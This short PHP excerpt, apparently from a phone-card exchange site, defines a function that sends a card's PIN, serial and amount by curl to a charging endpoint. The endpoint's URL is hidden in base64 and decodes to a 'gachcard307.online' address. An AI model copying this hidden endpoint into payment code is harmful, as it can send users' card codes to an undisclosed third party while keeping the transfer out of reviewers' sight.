...
function card24h($telco, $amount, $serial, $pin, $trans_id){
    ...
    $url = base64_decode('aHR0cHM6Ly9nYWNoY2FyZDMwNy5vbmxpbmUvY2hhcmdpbmd3cy92Mj9zaWduPQ==').md5($partner_key.$pin.$serial).'&telco='.$telco.'&code='.$pin.'&serial='.$serial.'&amount='.$amount.'&request_id='.$trans_id.'&partner_id='.$partner_id.'&command=charging';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
